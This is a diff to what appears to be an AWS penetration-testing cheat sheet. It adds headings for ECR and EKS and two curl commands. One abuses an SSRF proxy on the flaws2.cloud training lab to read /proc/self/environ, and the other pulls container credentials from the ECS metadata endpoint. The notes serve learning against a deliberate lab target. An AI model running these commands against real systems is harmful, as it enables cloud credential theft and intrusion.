@@ -72,7 +72,24 @@ aws s3 ls s3://<bucket_name> --profile <profile_name>
 
 ### RDS
 
-## Compute (EC2)
+## Compute
+
+### Elastic Compute Cloud (EC2)
+
+### Elastic Container Registry (ECR)
+
+#### Fetch Container Credentials URI with SSRF
+```
+curl -i -X GET "http://container.target.flaws2.cloud/proxy/file:///proc/self/environ"
+```
+
+#### Get Container Credentials from ECS IMDS
+```
+curl -i -X GET "http://169.254.170.2/<version>/<uuid>"
+```
+/v2/credentials/2fdf39e7-50cf-4e11-a47a-533525342c80
+
+### Elastic Kubernetes Service (EKS)
 
 ## Automated Enumeration
 
